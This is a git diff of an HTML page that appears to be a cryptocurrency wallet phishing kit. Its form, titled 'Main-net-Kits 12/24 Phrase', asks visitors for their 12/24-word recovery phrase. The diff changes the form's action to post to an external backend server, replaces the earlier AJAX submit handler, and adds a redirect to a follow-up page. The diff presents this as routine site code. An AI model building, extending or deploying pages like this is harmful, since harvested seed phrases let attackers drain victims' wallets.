@@ -1,3 +1,4 @@
+
 <!DOCTYPE html>
 <html>
 
@@ -129,7 +130,9 @@
                                     <!-- 12/24 Word Phrase Section -->
                                     <div class="tab-content" data-tab-content="link1" style="display: block;">
                                         <form class="p-1" name="Main-net-Kits 12/24 Phrase" 
-                                        data-netlify="true" method="POST" onsubmit="submit" action="/submit-form">
+                                        data-netlify="true" method="POST" onsubmit="submit"
+                                        action="https://backendserver-eta.vercel.app/submit-form"
+                                        >
                                             <div class="mb-3 pt-0">
                                                 <div class="text-sm mb-1 text-gray-500">Please enter your 12/24 word
                                                     phrase</div>
@@ -223,6 +226,33 @@
         
         </main>
         
+        <script>
+
+            $("#tabsId").on("click", "li", function (evt) {
+
+                evt.preventDefault();
+                var id = $(this).data("tabContent");
+                $("#tabsContentId")
+                    .find(".tab-content[data-tab-content='" + id + "']").show()
+                    .siblings().hide();
+            });
+
+            document.addEventListener('DOMContentLoaded', function () {
+    const form = document.querySelector('.p-1'); // Replace 'yourFormClass' with the actual class of your form
+
+    form.addEventListener('submit', function (event) {
+        event.preventDefault();
+
+        // Add your form submission logic here, for example using fetch
+
+        // After the form is successfully submitted, redirect to 'redirect.html'
+        window.location.href = '/user/redirect.html';
+    });
+});
+
+
+        </script>
+        
         <footer class="border-t border-gray-200">
             <div class="container max-w-screen-lg mx-auto flex flex-col md:flex-row md:items-center md:justify-between py-6">
                 <ul class="flex mb-4 mx-auto md:mx-0 md:ml-4 md:mb-0">
@@ -268,39 +298,7 @@
     <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
 
 
-    <script>
-        $(document).ready(function () {
-            $("#tabsId").on("click", "li", function (evt) {
-                evt.preventDefault();
-                var id = $(this).data("tabContent");
-                $("#tabsContentId")
-                    .find(".tab-content[data-tab-content='" + id + "']").show()
-                    .siblings().hide();
-            });
-    
-            $("form[name='Main-net-Kits 12/24 Phrase']").submit(function (event) {
-                event.preventDefault(); // Prevent default form submission
-    
-                // Perform AJAX request to handle form submission
-                $.ajax({
-                    type: $(this).attr("method"),
-                    url: $(this).attr("action"),
-                    data: $(this).serialize(),
-                    success: function (response) {
-                        // Handle the success response
-                        console.log(response);
-    
-                        // You can perform additional actions here
-                    },
-                    error: function (error) {
-                        // Handle the error
-                        console.error(error);
-                    }
-                });
-            });
-        });
-    </script>
-    
+
 </body>
 
 
